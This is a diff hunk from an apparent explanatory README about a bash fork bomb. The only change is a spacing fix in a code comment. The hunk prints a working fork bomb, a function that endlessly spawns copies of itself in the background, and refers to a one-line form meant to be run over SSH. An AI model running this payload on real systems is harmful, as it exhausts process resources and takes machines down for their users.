@@ -9,7 +9,7 @@ The code works as following
 ```
 bomb() {        # Initialize the function
 bomb | bomb &   # Create new iteration of the function in background
-}; bomb         #End the function an iter again
+}; bomb         # End the function an iter again
 ```
 Or in just one line so it can be executed easely as a shell comand while in SSH connection.
 ```
